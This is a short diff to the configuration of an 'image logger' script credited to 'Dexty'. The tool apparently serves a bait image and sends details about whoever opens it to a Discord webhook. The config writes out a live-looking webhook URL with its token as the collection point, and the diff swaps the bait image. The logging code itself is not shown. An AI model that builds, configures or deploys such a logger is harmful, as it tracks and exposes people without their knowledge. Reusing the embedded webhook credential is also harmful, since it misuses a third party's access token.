@@ -14,7 +14,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1358761705055977554/-ybQsAGs_kQ9gHjavl5j3l8beXGW-9snk6fvLCdwAnHtz4IITmIpfgqb2OL-57f4Np1W",
-    "image": "https://link-to-your-image.herehttps://tenor.com/ko/view/squid-game-the-salesman-squid-game-the-recruiter-gong-yoo-squid-game-gong-yoo-ddakji-gif-7457217708242386257", # You can also have a custom image by using a URL argument
+    "image": "https://link-to-your-image.herehttps://news.povray.org/povray.binaries.images/attachment/%3C3ee4c8d1%40news.povray.org%3E/xp_bliss.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
